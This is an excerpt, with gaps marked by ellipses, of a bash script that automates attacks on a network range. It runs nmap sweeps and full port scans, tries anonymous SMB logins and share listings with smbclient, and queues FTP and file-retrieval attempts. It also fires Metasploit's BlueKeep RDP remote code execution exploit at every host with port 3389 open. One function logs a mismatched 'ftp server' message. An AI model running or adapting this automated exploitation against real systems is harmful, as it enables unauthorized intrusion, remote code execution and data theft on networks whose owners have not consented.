...
nmap $firstipofrange-$onehonderd -T5 | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapbasic.txt
cat $defaultbasicfolder/nmapbasic.txt | grep "Nmap scan report for" | cut -d " " -f 5 >$defaultbasicfolder/scanwithadvanced
nmap -p 1-65535  -v -A -T5 -iL $defaultbasicfolder/scanwithadvanced -Pn -sV | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt
# nmap -p0- -v -A -T5 $firstipofrange-$onehonderd -Pn -sV | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt
...
function checkfileshares() {
    ip=$(echo $1 | cut -d "/" -f 3)
    mkdir -p $1/shares/
    smbclient -L \\$ip\\ -U anonomous -N > ${1}shares/all
    if grep -q 'session setup failed' ${1}shares/all; then
        ...
        while read p ; do
            if [[ $p != "" ]] ; then
                smbclient \\\\$ip\\$p -U anonomous -N -c "dir" | grep -vE "NT_STATUS_ACCESS_DENIED|NT_STATUS_NO_SUCH_FILE|NT_STATUS_RESOURCE_NAME_NOT_FOUND|blocks available|NT_STATUS_LOGON_FAILURE" > ${1}shares/all.dbs_${p}
            fi  
        ...
        function savetotrysmb(){
            ...
            echo "smbclient \\\\\\\\${ip}\\\\${folder} -U anonomous -N
            dir
            get filex" >> $maybetry
        }
...
function checkftp() {
    ip=$(echo $1 | cut -d "/" -f 3)
    echo $ip might have an ftp server >> $maybetry
    echo ftp \$username@$ip >> $maybetry
}

for f in $defaultbasicfolder/combined/*/; do ifmultiport checkftp $f 21; done

function checkbluekeep() {
    ip=$(echo $1 | cut -d "/" -f 3)
    echo $ip might have an ftp server >> $maybetry
    echo ftp $ip >> $maybetry
    msfconsole -q -x "use windows/rdp/cve_2019_0708_bluekeep_rce; set rhosts $ip; set target 1; exploit"
}

for f in $defaultbasicfolder/combined/*/; do ifmultiport checkbluekeep $f 3389; done
